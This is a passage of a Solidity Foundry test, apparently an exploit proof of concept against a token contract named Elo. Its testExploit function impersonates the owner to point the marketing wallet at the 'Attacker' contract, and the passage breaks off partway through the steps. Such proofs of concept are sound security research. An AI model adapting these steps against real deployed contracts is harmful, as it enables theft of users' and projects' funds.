    Elo target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = Elo(TARGET);
        owner = target.owner();
        vm.label(owner, "Owner");
        vm.label(address(this), "Attacker");
        vm.label(TARGET, "Target Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Step 1: Impersonate owner and redirect marketing wallet to attacker
        vm.startPrank(owner);
        target.setMarketingWallet(address(this));
        vm.stopPrank();

        // Step 2: Send ETH to contract to ensure addLiquidity succeeds
